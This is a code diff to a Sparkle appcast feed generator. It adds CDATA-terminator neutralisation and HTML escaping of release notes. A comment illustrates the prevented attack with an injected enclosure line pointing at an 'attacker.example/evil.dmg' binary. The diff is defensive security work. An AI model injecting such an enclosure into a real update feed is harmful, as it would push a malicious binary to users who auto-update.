@@ -13,7 +13,10 @@
  * Output is deterministic given its inputs (no `Date.now()`), so it snapshot-tests.
  */
 
-import type { Release, ReleaseAsset } from "./github.js";
+import type { Release, ReleaseAsset } from "../release/github.js";
+import { versionFromTag } from "../release/channels.js";
+
+export { versionFromTag } from "../release/channels.js";
 
 export interface AppcastItemInput {
   /** Human title, e.g. `djdl 1.2.3`. */
@@ -57,13 +60,44 @@ function xmlEscape(s: string): string {
   return s.replace(/[&<>"']/g, (c) => XML_ESCAPES[c] ?? c);
 }
 
+/**
+ * Neutralise a CDATA terminator (R6-13 / R9-08).
+ *
+ * A `<![CDATA[…]]>` section ends at the FIRST `]]>` in its content, so a release note containing
+ * one closes the section early and everything after it is parsed as sibling XML — including a
+ * second `<enclosure url="https://attacker.example/evil.dmg" />`, which is an updater pointed at
+ * an attacker's binary. The standard escape splits the sequence across two sections: `]]` ends
+ * the first, `]]>` re-opens with `<![CDATA[`, and the `>` lands as ordinary character data. The
+ * text a client sees is byte-identical; the parse is not.
+ *
+ * This was Info-rated only because `descriptionHtml` had no producer. P2.T4 gives it one, so the
+ * fix lands in the same change.
+ */
+function neutralizeCdata(s: string): string {
+  return s.split("]]>").join("]]]]><![CDATA[>");
+}
+
+/**
+ * Render prose as the HTML the `<description>` element expects.
+ *
+ * `extractSummary` returns markdown-stripped PROSE, and `stripMarkdown` is explicitly not an
+ * HTML sanitiser — it removes emphasis and link syntax and leaves raw HTML intact (R6-13). So
+ * the summary is escaped rather than trusted: a release note that contains `<script>` arrives in
+ * the feed as the four characters `&lt;s`… and renders as text in Sparkle's release-notes view.
+ * That is the layer above `neutralizeCdata`, which stops the XML breakout; this one stops the
+ * markup that would otherwise survive it.
+ */
+export function proseToHtml(text: string): string {
+  return text.replace(/[&<>"']/g, (c) => XML_ESCAPES[c] ?? c);
+}
+
 /** Render one `<item>`. The DMG enclosure carries the Sparkle EdDSA attributes. */
 function renderItem(item: AppcastItemInput): string {
   const minSys = item.minimumSystemVersion
     ? `\n      <sparkle:minimumSystemVersion>${xmlEscape(item.minimumSystemVersion)}</sparkle:minimumSystemVersion>`
     : "";
   const desc = item.descriptionHtml
-    ? `\n      <description><![CDATA[${item.descriptionHtml}]]></description>`
+    ? `\n      <description><![CDATA[${neutralizeCdata(item.descriptionHtml)}]]></description>`
     : "";
   // When the pipeline didn't publish a sibling `.sig`, omit the attribute rather than 404 —
   // the feed is still valid; Sparkle clients that require signing simply won't auto-update.
@@ -91,11 +125,6 @@ ${items}
   </channel>
 </rss>
 `;
-}
-
-/** Parse `vX.Y.Z` / `X.Y.Z` to a bare semver string for the `shortVersionString`. */
-export function versionFromTag(tag: string): string {
-  return tag.replace(/^v/, "");
 }
 
 /** Format an ISO timestamp (or null) to an RFC-1123 pubDate. Falls back to epoch. */
@@ -134,9 +163,4 @@ export function buildAppcastItem(
       : {}),
     ...(opts.descriptionHtml ? { descriptionHtml: opts.descriptionHtml } : {}),
   };
-}
-
-/** The conventional sibling-signature asset name for a DMG (`<dmg>.sig`). */
-export function sigAssetName(dmgName: string): string {
-  return `${dmgName}.sig`;
 }
